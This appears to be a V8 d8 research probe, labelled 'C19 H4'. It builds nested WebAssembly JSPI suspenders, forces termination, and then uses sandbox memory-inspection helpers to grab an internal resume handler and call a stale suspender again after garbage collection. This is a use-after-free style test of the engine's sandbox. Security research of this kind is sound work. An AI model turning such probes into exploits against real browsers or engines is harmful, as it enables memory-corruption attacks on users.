// C19 H4: nested JSPI suspenders, then termination after outer resumes.
// Probe stale inner suspender after the whole nested chain unwinds.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
d8.file.execute('test/mjsunit/sandbox/wasm-jspi.js');

let builder = new WasmModuleBuilder();
let inner_idx = builder.addImport("m", "inner", kSig_v_v);
let outer_idx = builder.addImport("m", "outer", kSig_v_v);
let term_idx = builder.addImport("m", "term", kSig_v_v);

builder.addFunction("inner_export", kSig_v_v)
  .addBody([kExprCallFunction, inner_idx])
  .exportFunc();

builder.addFunction("outer_export", kSig_v_v)
  .addBody([
    kExprCallFunction, outer_idx,
    kExprCallFunction, term_idx,
  ]).exportFunc();

let resolve_inner;
let inner_p = new Promise(r => resolve_inner = r);
let inner_suspending = new WebAssembly.Suspending(() => inner_p);
let export_inner;
let inner_wasm_promise;
let outer_suspending = new WebAssembly.Suspending(() => {
  inner_wasm_promise = export_inner();
  return inner_wasm_promise;
});
let term = () => { %TerminateExecution(); };

let instance = builder.instantiate({
  m: {inner: inner_suspending, outer: outer_suspending, term}
});
export_inner = WebAssembly.promising(instance.exports.inner_export);
let export_outer = WebAssembly.promising(instance.exports.outer_export);

export_outer();

let inner_resume_data = get_resume_data(inner_p);
let outer_resume_data = get_resume_data(inner_wasm_promise);
let inner_resume_cb = Sandbox.getObjectAt(
    getField(getField(getPtr(inner_p), kJSPromiseReactionsOrResultOffset),
             kPromiseReactionFulfillHandlerOffset));

print("[*] inner suspender: 0x" + get_suspender(inner_resume_data).toString(16));
print("[*] outer suspender: 0x" + get_suspender(outer_resume_data).toString(16));

setTimeout(() => {
  print("[*] after nested terminate");
  gc({type:'major', execution:'sync', flavor:'last-resort'});
  print("[*] manual second resume of inner suspender");
  inner_resume_cb(undefined);
  print("[!] no violation");
}, 0);

print("[*] resolving inner -> outer resumes -> terminate");
resolve_inner();
